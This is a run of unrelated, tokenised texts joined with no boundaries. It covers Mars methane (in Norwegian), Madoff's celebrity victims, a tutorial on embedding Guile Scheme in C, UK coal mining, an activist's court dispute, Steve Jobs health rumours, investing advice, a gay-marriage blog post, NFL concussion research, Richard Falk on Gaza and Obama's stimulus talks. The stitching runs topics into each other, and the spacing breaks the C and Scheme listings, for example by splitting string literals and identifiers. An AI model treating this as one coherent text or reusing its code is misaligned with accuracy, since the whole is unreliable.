Variasjonen på Mars kan også forklares med at bakken varmes opp slik at gass fra en geologisk prosess lettere slipper ut , men likevel er det lett å si seg enig med Erik Tandberg , som tror gassutslippene stemmer overens med biologisk aktivitet .
Et klarere svar vil vi forh åpentligvis få når Mars Science Laboratory sendes avgårde i 2011 .
Den er utstyrt med instrumenter som spesifikt leter etter tegn til liv på overflaten og i atmosfæren .
Oddsene tilsier at geologien og kjemien triumferer denne gangen også , men selv det kan bety at sjansene for liv er mye større enn tidligere trodd .
Konsepttegning av Mars Science Laboratory
Geologisk aktivitet betyr nemlig at det fins varmekilder under overflaten på Mars .
Vi vet allerede at det skjuler seg is under den røde sanden , og det innebærer at det kan finnes « lommer » med varmt vann under overflaten sammen med metan , som kan fungere som « mat » for bakterier .
Hvorom alt er , kan vi stå overfor et frustrerende tiår for planetforskerne .
For sikker bekreftelse på liv finner vi bare ved å ta prøver fra stedene der metanen slippes ut .
Og for øyeblikket finnes det ingen konkrete planer for å sende avgårde et mobilt laboratorium som kan ta prøver dypt nede i bakken der gassen slippes ut .
Enda bedre hadde det vært å sende avgårde en romsonde som kan sende tilbake en prøve til Jorda , en såkalt Mars Sample Return - ferd .
Men skal man tro USAs og Europas romorganisasjoner , vil en slik ferd ikke være aktuell før 2020 - 2022 .
Det beste ville ha vært en bemannet ferd , men da snakker vi beste fall 2030 - 2040 før vi får se eventuelle marsvesener på nært hold .

The actress starred in films such as Moulin Rouge , Lili and Touch of Evil Veteran actress Zsa Zsa Gabor is said to have lost at least $ 7 m ( £ 5 m ) as a result of investments with the accused US businessman Bernard Madoff .
Ms Gabor , who is 92 next month , is among a number of celebrities affected by the alleged scam .
Bernard Madoff is accused of running a worldwide fraud that the authorities say may have cost investors $ 50 bn .
The once - respected money manager is under arrest at his Manhattan penthouse while an investigation continues .
A lawyer for Zsa Zsa Gabor said the actress had discovered her losses in the last few weeks , adding that she may have lost as much as $ 10 m .
The Hungarian - born actress starred in films such as Moulin Rouge , Lili and Touch of Evil .
If convicted , Mr Madoff faces up to 20 years in prison Famed for her rich husbands , she suffered a stroke four years ago .
Ms Gabor is not the only Hollywood figure apparently to have suffered losses because of an investment connected to Mr Madoff .
A foundation run by the Oscar - winning film director Steven Spielberg , and the actor Kevin Bacon and his wife , Kyra Sedgwick , are also reported to have fallen victim .
Mr Madoff , 70 , a former chairman of the Nasdaq stock market , was arrested and charged on 11 December in what would be Wall Street 's biggest Ponzi scheme , one in which early investors are paid - off with the money of new clients .
If convicted , he faces up to 20 years in prison and millions of dollars in fines .

Scripting with Guile
Extension language enhances C and Scheme
Guile , which launched in 1995 , is an interpreter for the Scheme language , a simplified derivative of the Lisp language , first introduced by John McCarthy in 1958 .
But Guile makes Scheme embeddable , which makes the interpreter ideal for embedded scripting .
Guile is n't just another extension language : it 's the official extension language of the GNU project .
You 'll find Guile used for scripting in a number of open source applications — from gEDA CAD tools to the Scheme Constraints Window Manager ( Scwm ) , which provides dynamic configurability through Scheme scripting ( see the Related topics section for links ) .
Guile follows a very successful history of application extension through scripting , from GNU Emacs , the GIMP , and Apache Web Server .
The key behind Guile is extensibility ; see Figure 1 .
With Guile , you can interpret Scheme scripts , dynamically bind scheme scripts into compiled C programs , and even integrate compiled C functions into Scheme scripts .
This valuable feature means that users can tailor or customize your applications to add their own value .
Figure 1 . Scripting use models for Guile
One of the best examples of application customization is in the video gaming industry .
Video games permit a tremendous amount of customization through scripting .
Many game programs even use scripting in their core design to implement certain aspects ( such as non-player character behavior ) with scripts .
A simple example
Let 's now look at a simple example of integrating Guile into a C language program .
In this case , I use a C program that calls a Scheme script .
Listing 1 and Listing 2 show the source for this first example .
Scripts in gaming Modern games commonly include scripting languages , from traditional interpreted languages like Python and Ruby to special - purpose scripting languages like UnrealScript ( see the Related topics section for links ) .
In game systems , these scripting languages can be used to implement the behaviors of non-player characters and even the behavior of objects that appear in the game .
Game development is more convenient with scripts , because long compile cycles are unnecessary to introduce new behaviors .
If you dig down into the subdirectories of your favorite PC - based game , more often than not , you 'll find scripts .
Listing 1 presents the C application that invokes the Scheme script .
The first thing to notice is the inclusion of the libguile.h header file , which makes available the necessary Guile symbols .
Next , notice a new type defined : SCM .
This type is an abstract C type that represents all Scheme objects contained within Guile .
Here , I 'm representing the Scheme function that I call later .
The first thing that needs to be done for any thread using Guile is to make a call to scm_init_guile .
This function initializes the global state of Guile and must be called prior to any other Scheme function .
Next , prior to calling a Scheme function , the file in which this function resides must be loaded .
You do this by using the scm_c_primitive_load function .
Note the naming here : the _c_ in the function indicates that it is passed a C variable ( rather than a Scheme variable ) .
Next , I use scm_c_lookup to find and return the variable bound by the symbol ( the Scheme function in the model ) , which is then dereferenced with scm_variable_ref and stored in the Scheme variable func .
Finally , I call the Scheme function using scm_call_0 .
This Guile function calls a previously defined Scheme function with zero arguments .
Listing 1 . A C program that invokes a Scheme script
#include < stdio.h > # include < libguile.h > int main ( int argc , char ** arg ) { SCM func ; scm_init_guile ( ) ; scm_c_primitive_load( " script.scm " ) ; func = scm_variable_ref ( scm_c_lookup ( " simple - script " ) ) ; scm_call_0 ( func ) ; return 0 ; }
Listing 2 provides the Scheme function that is invoked from within the C program .
This function uses the display procedure to print a string to the screen .
This function is followed by a call to the procedure newline , which outputs a carriage return .
Listing 2 . A Scheme script that is called from C ( script.scm )
( define simple - script ( lambda ( ) ( display " script called " ) ( newline ) ) )
What 's interesting here is that the script is not statically bound to the C program ; it is dynamically bound .
The Scheme script can be changed , and when the previously compiled C program is executed , it will execute the new behavior implemented in the script .
That 's the power of embedded scripting : you take the speed of compiled applications and provide the extensible power of dynamic scripting .
Now that you have a simple example under your belt , let 's dig in a little further to explore some of the other elements of Scheme scripting within the C language .
A short introduction to Scheme
As Scheme may seem a bit foreign to some , let 's look at a few examples that illustrate the power of the language .
These examples illustrate variables , conditionals , and loops in addition to some of the key features of Scheme .
A full treatment of Scheme is outside the scope of this article , but you can find links to references in the Related topics section .
In these examples , I use the Guile interpreter , which allows me to work with Scheme in real time , providing Scheme code and seeing the results immediately .
Variables
Scheme is a dynamically typed language ; therefore , the type of a variable is not generally known until run time .
Scheme variables are then simply containers whose type can be defined later .
Variables are created using the define primitive , then changed with the set ! primitive .
Here , I do just that :
guile > ( define my - var 3 ) guile > ( begin ( display my - var ) ( newline ) ) guile > ( set ! my - var ( * my - var my - var ) )
Procedures
Not surprisingly , it 's also possible to create procedures in Scheme — also with the define primitive .
Procedures can be anonymous ( lambda procedures ) or named .
In the case of named procedures , they 're stored in a variable , as shown here :
( define ( square val ) (* val val ) )
This form differs from the traditional Lisp syntax , if you happen to be familiar with that , but it 's somewhat simpler to read .
I can then use this new procedure just like any other primitive , as shown here :
guile > ( square 5 ) 25
Conditionals
Scheme contains a few ways to do conditionals .
The most basic is the simple if condition .
It defines a test conditional , a true expression , and an optional false expression .
In the example below , you can see the list processing perspective of Scheme .
The list begins with if and ends with ( display " less " ) .
Recall that Scheme is a derivative of Lisp and therefore is built of lists .
Scheme represents both code and data as lists , which allows the language to blur the line ( code as data and data as code ) .
guile > ( define my - var 3 ) guile > ( if (> my - var 20 ) ( display " more " ) ( display " less " ) ) less
Loops
Scheme implements loops through recursion , which forces a particular mindset when implementing a loop .
However , it 's a natural way to iterate .
The following example illustrates a Scheme script that iterates from 0 to 9 , then prints done .
This example uses what in Scheme is called tail recursion .
Note at the end of the loop that I recursively call the same function with an argument that is one greater than the previous , implementing the iteration of the loop .
In traditional languages , this recursion eats away at the stack to maintain a history of the calls ; in Scheme , it 's different .
The last call ( the tail ) simply invokes the function without any procedure call or stack maintenance overhead .
( let countup ( ( i 0 ) ) ( if ( = i 10 ) ( begin ( display " done " ) ( newline ) ) ( begin ( display i ) ( newline ) ( countup (+ i 1 ) ) ) ) )
Another interesting way to loop in Scheme is through the map procedure .
This concept simply applies ( or maps ) a procedure to a list , as shown in the following example .
This approach is both readable and simple .
guile > ( define my - list ' ( 1 2 3 4 5 ) ) guile > ( define ( square val ) (* val val ) ) guile > ( map square my - list ) ( 1 4 9 16 25 )
Extending C programs with Scheme scripts
As you saw in Listing 1 , extending C programs with Scheme is relatively painless .
Now , here 's another example that explores some of the other application programming interfaces ( APIs ) available for bridging C to Scheme .
In most applications , you need to not only make calls to Scheme but also pass argument to Scheme functions , receive return values , and share variables between the two environments .
Guile provides a rich set of functions to enable this functionality .
Guile attempts to straddle the line between the two environments and extend to C the power of Scheme .
In this regard , you 'll find dynamic types , continuations , garbage collection , and other Scheme concepts extended to C through the Guile API .
One example of extending Scheme concepts into C is the ability to dynamically create new Scheme variables from the C environment .
The C function for creating Scheme variables is scm_c_define .
Recall that _c_ indicates that you 're providing a C type as the argument .
If you already had the Scheme variable ( as provided by the scm_c_lookup function ) , you could instead use scm_define .
In addition to creating Scheme variables in C , you can also dereference Scheme variables and convert values between the two environments .
I explore examples of these in Listing 3 .
Listing 3 and Listing 4 present two examples of interactions between C and Scheme .
The first example illustrates calling a Scheme function from C , passing in an argument , and capturing the return value .
The second example creates a Scheme variable to pass in the argument .
Listing 4 presents the Scheme functions , which implement the same behavior , but the first with an argument and the second with a static variable .
scm_call limitations
Guile provides five variants of scm_call .
A Scheme function can be called with zero arguments ( scm_call_0 ) or as many as four arguments ( scm_call_4 ) , restricting the number of Scheme variables passed through Guile to four .
Additionally , variable argument functions are not supported .
If more than four arguments or a variable number of arguments need to be passed , a Scheme list object can be constructed with the desired number of arguments .
In the first example in Listing 3 , I simply use the scm_call_1 function to call the Scheme function with one argument .
Note that here you must pass in Scheme values to the function :
The scm_int2num function is used to convert a C integer into a Scheme numerical data type .
You use the opposite scm_num2int to convert the Scheme variable ret_val into a C integer value .
The second example in Listing 3 begins by creating a new Scheme variable with scm_c_define , identified by a C string variable ( sc_arg ) .
This variable is auto - initialized using the type conversion function scm_int2num .
Now that the Scheme variable has been created , you can simply call the Scheme function square2 ( this time without an argument ) and follow the same process to grab and dereference the return value .
Listing 3 . Exploring Scheme functions and variables with C
#include < stdio.h > # include < libguile.h > int main ( int argc , char * argv [ ] ) { SCM func ; SCM ret_val ; int sqr_result ; scm_init_guile ( ) ; /*
Calling the square script with a passed argument */ scm_c_primitive_load( " script.scm " ) ; func = scm_variable_ref ( scm_c_lookup ( " square " ) ) ; ret_val = scm_call_1 ( func , scm_int2num ( 7 ) ) ; sqr_result = scm_num2int ( ret_val , 0 , NULL ) ; printf ( " result of square is %d
" , sqr_result ) ; /*
Calling the square2 script using a Scheme variable */ scm_c_define ( " sc_arg " , scm_int2num ( 9 ) ) ; func = scm_variable_ref ( scm_c_lookup ( " square2 " ) ) ; ret_val = scm_call_0 ( func ) ; sqr_result = scm_num2int ( ret_val , 0 , NULL ) ; printf ( " result of square2 is %d
" , sqr_result ) ; return 0 ; }
Listing 4 presents the two Scheme procedures that are used by the C program shown in Listing 3 .
The first procedure , square , is a traditional Scheme function that accepts a single argument and returns a result .
The second procedure , square2 , accepts no arguments , but instead operates on a Scheme variable ( sc_arg ) .
As with the previous procedure , this variable also returns the result .
Listing 4 . Scheme scripts that are called from Listing 3 ( script.scm )
( define square ( lambda ( x ) (* x x ) ) ) ( define square2 ( lambda ( ) (* sc_arg sc_arg ) ) )
Extending Scheme scripts with C functions
In this final example , I explore the process of calling C functions from Scheme scripts .
I start with the Scheme - callable function in Listing 5 .
The first thing you 'll notice is that although this is a C function , it receives a Scheme object and returns a Scheme object in response ( SCM type ) .
I begin by creating a C variable that I use to grab the SCM argument using the scm_num2int function ( converting the Scheme numerical type to a C int ) .
With this , I square the argument and return it through another call to scm_from_int .
The remainder of the program in Listing 5 sets up the environment to boot into Scheme .
After initializing the Guile environment , I export the C function to Scheme with a call to scm_c_define_gsubr , which takes as arguments the name of the function in Scheme , the number of arguments ( required , optional , rest ) , and the actual C function to be exported .
The rest you 've seen before .
I load the Scheme script , get a reference to the particular Scheme function , and call it with no arguments .
Listing 5 . C program for setting up the environment for Scheme
#include < stdio.h > # include < libguile.h> SCM c_square ( SCM arg ) { int c_arg = scm_num2int ( arg , 0 , NULL ) ; return scm_from_int ( c_arg * c_arg ) ; } int main ( int argc , char * argv [ ] ) { SCM func ; scm_init_guile ( ) ; scm_c_define_gsubr( " c_square " , 1 , 0 , 0 , c_square ) ; scm_c_primitive_load( " script.scm " ) ; func = scm_variable_ref ( scm_c_lookup ( " main - script " ) ) ; scm_call_0 ( func ) ; return 0 ; }
Listing 6 provides the Scheme script .
This script displays the response to the call to c_square , which is the function exported in the C program in Listing 5 .
Listing 6 . Scheme script that calls the C function ( script.scm )
( define main - script ( lambda ( ) ( begin ( display ( c_square 8 ) ) ( newline ) ) ) )
A trivial example , but it illustrates the ease with which you can share code and variables between the two language environments .
Epilogue
The days of building and delivering static software and products are over .
Today , users expect their products to be dynamic and easily customizable .
Although this evolution comes with new complexity , it ultimately allows users to show us the way to create new value in our applications .
Hopefully , this article helps you glimpse the power of Guile .
Scheme may be one of the oldest programming languages still in use , but it also remains one of the most powerful .
Guile has succeeded in making it even more powerful and useful .

Britain 's coal industry is on track to break a new production record as it expands at a time when many environmentalists are calling for it to be cut back or closed down .
The West Midlands colliery of Daw Mill near Nuneaton is expected to produce more coal this year than any other in the history of an indigenous industry that began with the Romans .
And this week a rig will move into position to drill three exploratory boreholes that could lead to reopening of a mothballed mine at Harworth in north Nottinghamshire .
Daw Mill has already mined 3 m tonnes this year and staff are confident of hitting 3.25 m tonnes by the end of this month , beating a 13 - year - old record for annual output set at Selby , North Yorkshire .
" This is a remarkable achievement and shows our mining skills are world class , " said Jon Lloyd , chief executive of UK Coal , which runs Daw Mill and four other deep mines .
The production rise comes at a time when at least 14 companies have applied to develop 58 new opencast mines in Britain , giving coal its biggest boost in 30 years .
Much of the industry was closed down after the disastrous strike in 1984 and 1985 .
There are now 680 miners working at Daw Mill and the company is looking at whether it can extend working there to exploit a further 40 m tonnes of coal .
A further 40 m tonnes could be accessed at Harworth if UK Coal obtains positive results from the boreholes and a separate seismic survey .
If Harworth re-starts , at an estimated cost of £ 200 m , it would provide work for 400 skilled miners at the Welbeck colliery near Mansfield which is due to close at the end of next year .
UK Coal is spending £ 100 m on extending output at Thoresby in Nottinghamshire and Kellingley in West Yorkshire .
The bulk of the Daw Mill output goes by rail to the Ratcliffe power station near Nottingham which is run by the German - owned utility E.ON , with some of the rest used by the Cottam facility operated by EDF of France .
E.ON is among the energy producers that want to build new coal - fired power stations , including the controversial Kingsnorth scheme in Kent .
The government is trying to decide whether it will allow new stations with or without pilot schemes for carbon capture and storage ( CCS ) , a technique which buries carbon dioxide to reduce emissions from coal plants .
The European Union has been gradually introducing tougher environmental restrictions on the burning of coal at power stations , and environmentalists consider CCS vital .
The expansion of coal mining in Britain follows a reassessment of its economics triggered by a tripling of commodity prices over the past two years .
When Harworth closed in August 2006 , the price of world coal was £ 34 a tonne .
That rose to £ 100 although it has since fallen back to half of this level .
About 60 % of coal burned at UK power stations is imported from countries such as Russia , South Africa and Colombia .
Greenpeace opposes the development of mining and is sceptical about " clean coal " projects using CCS .
" Coal is the most carbon - intensive of all fossil fuels , " it argues .
" Being nearly pure carbon , it releases nearly pure carbon dioxide .
In the sector that changes our climate the most , coal is the worst offender . "
As announced on last night ’s Free Talk Live , the Keene city prosecutor , Sgt. Eliezer Rivera has sent me threatening paperwork where he is requesting that Keene District Court force me into a hearing which could result in the suspended sentence I was given being revoked , thereby landing me back in jail for 90 days .
Why ?
Apparently because I sent out Andrew Carroll ’s press release in regards to this past Saturday ’s marijuana protest , blogged about it , atttended , videotaped it , and because I had Andrew on Saturday night ’s Free Talk Live .
Here is the threatening “ Motion to Show Cause ” from Mr. Rivera in PDF form .
So , because I engaged in freedom of speech , I ’m now a criminal ?
How many others will they target over this ?
Free Minds TV , the NH Free Press , and NH Capitol Access were also “ promoting ” the event .
What about the other attendees ?
Are they at risk as well ?
Does Rivera realize that in his attempts to intimidate NH ’s liberty activist community , he will only create more peaceful disobedience and outrage ?
Is he scaring you , or is he making you more determined to get active and if you ’re not yet here in NH , to get here sooner ?
Sam from the Obscured Truth Network is helping me work up a “ Motion to Quash ” this nonsense .
Will post more later .
Amid a flurry of ( disputed ) reports and rumors about Apple chief executive Steve Jobs ’ “ rapidly declining health , ” blogger Robert Scoble did some field work to dig for the truth today .
Well okay , he was in a yogurt shop with his friend , Socialtext cofounder Ross Mayfield , when Mayfield mentioned he had seen Jobs there in the past .
So Scoble decided to ask the person working behind the counter if they ’d seen Jobs recently .
And guess what ?
They had .
“ I ’m in Palo Alto .
Just had yogurt at shop that Steve Jobs eats at frequently .
They said he was in a couple of days ago and is in great health , ” Scoble posted on the social aggregation service FriendFeed .
Apparently , the yogurt store in question , Fraiche Yogurt , delivers yogurt to Apple executives every week , Scoble wrote in a comment .
A separate blog , Swanktastic , confirms that Jobs ( and other big names in tech ) have been seen at the shop in recent months .
While a yogurt store employee may not seem like the best source in the world , look at the sources attached to the other stories about Jobs ’ health — in quite a few cases there are none and it ’s all speculation .
Or , in today ’s case , it ’s an unnamed source who ’s been right in predicting Apple product announcements in the past .
At least CNBC ’s Jim Goldman claims to have sources inside Apple telling him the rumors of Jobs being sick are n’t true , but for a lot of people that is n’t enough , considering Apple has been misleading to some extent in the past .
So give me the first - hand account from the yogurt store employee who ’s seen Jobs with their own two eyes recently .
It ’s better than blind speculation .
( Money Magazine ) -- Welcome to the Olympics of investing .
Unfortunately , you are not a spectator .
The S&P 500 index of large - cap stocks has lost more than 40 % since November 2007 , and about $ 2 trillion in value has disappeared from investors ' 401 ( k ) s and IRAs , according to the Center for Retirement Research .
So you probably do n't feel that you have much chance of taking a victory lap .
But if history teaches us anything , it 's that the sweetest victories are won in markets just like this one , even if it does n't seem that way at the time .
Think of bull markets as a 5 K fun run .
Just about anyone can join in and earn boffo returns for a while .
This time , though , what you thought was a fast neighborhood jog turned out to be an elite marathon - just another 23 miles to go !
- with many participants having collapsed wheezing and exhausted on the sidelines .
That means that they are handing over their stocks , at cheaper prices , to the disciplined investors who began the race in good financial condition .
By financial condition , I do n't mean the state of the buyers ' bank account or even their market expertise but rather their emotional fitness to handle market volatility .
And most of us are n't born with that .
You have to train .
Why emotional fitness matters
Well - trained investors know the collapse of 2008 was not some aberration .
In fact , there have been four other times since 1926 that stocks have fallen at least 40 % from a recent peak .
The first three - in 1929 - 30 , 1937 - 38 and 1972 - 74 - allow us to examine long - term returns after a crash .
( The fourth , from 2000 to 2002 , is too recent . )
The lesson ?
As John Maynard Keynes observed , " selling at very low prices [ is not ] a remedy for having failed to sell at high ones . "
Quite the opposite .
Imagine that you had the psychological fortitude to invest in stocks on Nov. 1 , 1930 , after the market fell 41 % .
This was by no means the bottom :
The bear still had another 20 months to run , bringing eventual losses to 83 % , according to Ibbotson .
Even so , equities delivered a real ( after inflation ) return of 2.9 % annually over the subsequent 10 years and 4.5 % over the next 20 years .
But that 's the worst - case scenario .
Buying stocks after the 1937 -38 and 1972 - 74 debacles provided far better results .
If you invested in equities on Oct. 1 , 1974 , for example , your real annualized return was 7.5 % over the next 10 years and 9 % over 20 .
This suggests that high future returns are a good possibility now .
Your training regimen
Now that you know just how long and rigorous this event really is , how do you train for it ?
The basic workout is consistent asset allocation .
It 's okay to keep your plan simple - say , 45 % domestic stocks , 15 % foreign stocks and 40 % bonds .
The point is n't to come up with the perfect strategy as much as it is to have one that you 'll stick with in up - and - down markets .
Then , once a year , rebalance back to those levels .
In the good years , this means selling some stocks to get things back into balance , and in the bad years it means selling some bonds to buy more stocks .
The latter is harder to do than the former .
There 's no better way of keeping yourself fit than regular rebalancing , particularly during bear markets .
By making it a routine math exercise instead of an annual review of the market or your strategy , you 'll find it easier to tune out your emotions .
The good news is that unlike an elite athlete , an emotionally fit investor does n't have to wake up at 6 a.m. every morning to work out ( or tune in to CNBC ) .
In fact , it 's better not to think about investing most of the time .
I know no greater investment pro than Vanguard founder John Bogle ; he tells me that he peeks at his holdings only once a year .
In this race , the edge goes to the disciplined couch potato .

Yesterday , we discussed an ongoing Marketwatch chart on historical trend regressions ( Is the Market Bottom in Sight ( Again ? ) ) .
Peter Brimelow and Edwin S. Rubenstein have argued that markets bottom when they fall to 40 - 42 % below trend .
Doug Short disagrees .
As he shows in the chart below , markets have dropped as much as 67 % below trend , with bottoms at levels of more than 50 % below trend .

I find myself at this moment torn .
I am torn between what I was raised to believe and what I know in my heart is true .
But this I do know , what is the difference between hammering to your children that they must follow their parents religious beliefs and giving gays the right to marry ?
I believe the first statement is far worse and deadening .
Ted Haggard is a great example .
This man was a strong christian and he ran a very large evangelical church in Colorado .
What did we find out though ?
He was having a homosexual relationship with a male hooker .
This was because he was suppressed of his sexuality all of his life , until the truth finally came to be revealed .
This is what indoctrinating our children does .
I have been indoctrinated and today I have been set free .
I no longer hold the views of the anti gay marriage far right .
It seems as if the conservative christians have forgotten what Jesus ' message was about .
It was about love and it was about acceptance .
As I recall from scripture , the pharisees did n't like this .
So why do we twist the words of Jesus Christ to fit our views .
Why do we use the bible as a weapon to destroy the hope of people ?
This makes no sense .
My eyes have been open today and I can finally see .
Tomorrow I will be dubbed as a ' victim of the gay agenda '
This statement in general is horrendous .
There is no ' gay agenda ' there are people , people who want to get married .
They want a damned certificate that says they are bound forever .
But we wont give them that , because we are afraid our children will be gay ?
Are you serious !?
Is America this far gone ?
Can we only come so far only to be stopped by a wall that we refuse to climb over .
We abolished slavery because we realized it was wrong .
We gave women the right to vote because not doing so was wrong .
We stopped imprisoning Japanese Americans because it was wrong .
When are we going to realize that prohibiting gay marriage is wrong .
Has anyone on the right seen that this makes a gay person less of an American ... that we would prohibit their rights .
It is not redefining the constitution ... rather it is realization that gays are people .
They are Americans ... and they deserve every single right and every single privilege that you are me do .
So , to Mr Olbermann : Thank you .
I hope there are many others that are effected by your words .
I hope there are many others that change their minds , because this matters .
I sat there with goosebumps as you spoke because I was appalled by my own beliefs and now I see and I admit to everyone that reads this simple blog that I was wrong and I am sorry .
This is America .
I think 52 % of California forgot that .
California :
Next time you consider raising millions of useless dollars into a hate campaign : try donating it to charity , feed the hungry , create missions trips to 3rd world countries , help the elderly , help donate to build hospitals , put money into cancer research ... anything that is n't spreading indoctrinated propaganda that further spreads fear and hate .
1 Corinthians 13:13
" So now faith , hope , and love abide , these three ; but the greatest of these is love . "
( CNN ) --
For years after his NFL career ended , Ted Johnson could barely muster the energy to leave his house .
In healthy brain tissue , virtually no protein tangles , which show up as brown spots , are visible .
" I 'd [ leave to ] go see my kids for maybe 15 minutes , " said Johnson .
" Then I would go back home and close the curtains , turn the lights off and I 'd stay in bed .
That was my routine for two years .
" Those were bad days . "
These days , the former linebacker is less likely to recount the hundreds of tackles , scores of quarterback sacks or the three Super Bowl rings he earned as a linebacker for the New England Patriots .
He is more likely to talk about suffering more than 100 concussions .
" I can definitely point to 2002 when I got back - to - back concussions .
That 's where the problems started , " said Johnson , who retired after those two concussions .
" The depression , the sleep disorders and the mental fatigue . "
Until recently , the best medical definition for concussion was a jarring blow to the head that temporarily stunned the senses , occasionally leading to unconsciousness .
It has been considered an invisible injury , impossible to test -- no MRI , no CT scan can detect it .
Watch more on what goes on in athlete 's brains »
But today , using tissue from retired NFL athletes culled posthumously , the Center for the Study of Traumatic Encephalopathy ( CSTE ) , at the Boston University School of Medicine , is shedding light on what concussions look like in the brain .
The findings are stunning .
Far from innocuous , invisible injuries , concussions confer tremendous brain damage .
That damage has a name : chronic traumatic encephalopathy ( CTE ) .
CNN American Morning Watch more on concussions and the brain Wednesday
6 a.m. - 9 a.m. CNN American Morning »
On Tuesday afternoon , researchers at the CSTE released a study about the sixth documented case of CTE in former NFL player Tom McHale , who died in 2008 at the age of 45 , and the youngest case to date , an 18 - year - old multi- sport athlete who suffered multiple concussions .
While CTE in an ex-NFL player 's brain may have been expected , the beginnings of brain damage in an 18 - year - old brain was a " shocking " finding , according to Dr. Ann McKee , a neuropathologist at the Veterans Administration Hospital in Bedford , Massachusetts , and co-director of the CSTE .
" We think this is how chronic traumatic encephalopathy starts , " said McKee .
" This is speculation , but I think we can assume that this would have continued to expand . "
CTE has thus far been found in the brains of six out of six former NFL players .
" What 's been surprising is that it 's so extensive , " said McKee .
" It 's throughout the brain , not just on the superficial aspects of the brain , but it 's deep inside . "
CSTE studies reveal brown tangles flecked throughout the brain tissue of former NFL players who died young -- some as early as their 30s or 40s .
McKee , who also studies Alzheimer 's disease , says the tangles closely resemble what might be found in the brain of an 80 - year - old with dementia .
" I knew what traumatic brain disease looked like in the very end stages , in the most severe cases , " said McKee .
" To see the kind of changes we 're seeing in 45 - year - olds is basically unheard of . "
The damage affects the parts of the brain that control emotion , rage , hypersexuality , even breathing , and recent studies find that CTE is a progressive disease that eventually kills brain cells .
Chris Nowinski knows well the impact of concussions .
He was a football star at Harvard before wrestling professionally with World Wrestling Entertainment .
In one moment , his dreams of a long career wrestling were dashed by a kick to his chin .
That kick , which caused Nowinski to black out and effectively ended his career , capped a career riddled with concussions .
" My world changed , " said Nowinski .
" I had depression .
I had memory problems .
My head hurt for five years . "
Nowinski began searching for studies , and what he found startled him .
" I realized when I was visiting a lot of doctors , they were n't giving me very good answers about what was wrong with my head , " said Nowinski .
" I read [ every study I could find ] and I realized there was a ton of evidence showing concussions lead to depression , and multiple concussion can lead to Alzheimer 's . "
Nowinski decided further study was needed , so he founded the Sports Legacy Institute along with Dr. Robert Cantu , a neurosurgeon and the co-director of the CSTE .
The project solicits for study the brains of ex-athletes who suffered multiple concussions .
Once a family agrees to donate the brain , it is delivered to scientists at the CSTE to look for signs of damage .
So far , the evidence of CTE is compelling .
The Center for the Study of Traumatic Encephalopathy , along with other research institutions , has now identified traumatic encephalopathy in the brains of late NFL football players John Grimsley , Mike Webster , Andre Waters , Justin Strzelczyk and Terry Long , in addition to McHale .
Grimsley died of an accidental gunshot wound to the chest .
Webster , Long and Strzelczyk all died after long bouts of depression , while Waters committed suicide in 2006 at age 44 .
McHale was found dead last year of an apparent drug overdose .
" Guys were dying , " said Nowinski .
" The fact of the matter was guys were dying because they played sports 10 or 20 years before . "
So far , around 100 athletes have consented to have their brains studied after they die .
Ted Johnson was one of the first to sign up .
He said he believes that concussions he suffered while playing football explain the anger , depression and throbbing headaches that occasionally still plague him .
Johnson said he played through concussions because he , like many other NFL athletes , did not understand the consequences .
He has publicly criticized the NFL for not protecting players like him .
" They do n't want you to know , " said Johnson .
" It 's not like when you get into the NFL there 's a handout that says ' These are the effects of multiple concussions so beware . ' "
In a statement , the NFL indicated that their staffs take a cautious , conservative approach to managing concussions .
While they support research into the impact of concussions , they maintain that , " Hundreds of thousands of people have played football and other sports without experiencing any problem of this type and there continues to be considerable debate within the medical community on the precise long - term effects of concussions and how they relate to other risk factors . "
The NFL is planning its own independent medical study of retired NFL players on the long - term effects of concussion .
" Really my main reason even for talking about this is to help the guys who are already retired , " said Johnson .
" [ They ] are getting divorced , going bankrupt , can't work , are depressed , and do n't know what 's wrong with them .
[ It is ] to give them a name for it so they can go get help . "
" The idea that you can whack your head hundreds of times in your life and knock yourself out and get up and be fine is gone , " said Nowinski .
" We know we can't do that anymore .
This causes long - term damage . "

UN human rights expert and retired Princeton law professor Richard Falk said today that there is compelling evidence that Israel violated the laws of war by “ conducting a large - scale military operation against an essentially defenseless population . ”
“ There needs to be an investigation carried out under independent auspices as to whether these grave breaches of the Geneva Conventions should be treated as war crimes , ” the professor said , adding that he believes “ that there is the prima facie case for reaching that conclusion . ”
“ This is the first time I know of where a civilian population has been essentially locked into the war zone , not allowed to leave it despite the dense population and the obvious risks that were entailed , ” Falk pointed out , “ the civilians in Gaza were denied the option of becoming a refugee . ”
Professor
Falk made international news when , less than two weeks before Israel began the war on the Gaza Strip , he was detained by Israeli officials for over 20 hours at a Tel Aviv airport while trying to enter the country as the UN Special Rapporteur on Human Rights in the Palestinian Territories .
He was eventually expelled from the country , provoking an angry response from the United Nations and human rights groups .
Unsurprisingly , Israeli Ambassador to the United States Aharon Leshno - Yaar made no attempt to answer the charges , choosing rather to attack Professor Falk ’s history of criticism for Israel ’s treatment of the Palestinians , insisting “ Professor Falk ’s bias against Israel is well known . ”

Obama and Transportation Secretary Ray LaHood arrive for meetings with Republican lawmakers on Capitol Hill .
Obama wo n't compromise on tax cuts
President Barack Obama rolled into the Capitol with a clear message for Republicans Tuesday afternoon :
He ’s happy to talk , but he ’s not compromising on his tax rebates for lower income households .
Obama was ready for the House Republicans to pounce , telling them : " Feel free to whack me over the head because I probably will not compromise on that part [ refundable tax credits ] , ” according to two sources in the room .
Advertisement
In the meeting , Obama acknowledged a fundamental divide between Republicans and Democrats on the issue of a tax rebates for people at the lowest income level - Republicans complain that tax cuts for people who do n't pay income taxes amounts to " welfare through the tax code . "
House Republicans pelted Obama for more than 30 minutes with questions about deficits , taxes and spending , according to sources inside the private meeting .
Rep. Kevin Brady ( R - Texas ) , won applause from his GOP colleagues when he asked the president whether he would promise that the stimulus would not be an excuse to raise taxes or increase spending .
Rep. Dave Camp ( R - Mich . ) , asked Obama for common ground on taxes in the $ 825 billion package – and was rejected .
Obama responded , according to sources in the room , that he was worried about the deficit and debt , and promised that his fiscal 2010 budget – coming out next month – would make hard choices in terms of spending cuts in an effort to reduce the deficit .
And the reality is that Obama and Democrats do n’t need any Republican House votes to pass the stimulus .
After an hour with House Republicans , Obama headed to meet the Senate GOP conference .
The Tuesday meeting comes a day after the Senate GOP surprised the administration Monday evening by mustering a muscular 30 votes — including their three top leaders — against the inevitable confirmation of Tim Geithner as Treasury Secretary .
“ I recognize that we 're not going to get 100 percent of support but I think everybody there felt good that I 'm willing to explain how I put the package together , how we were thinking about it , ” Obama said in brief remarks after the House Republican meeting .
Publicly , Republicans played nice once the president left their meeting .
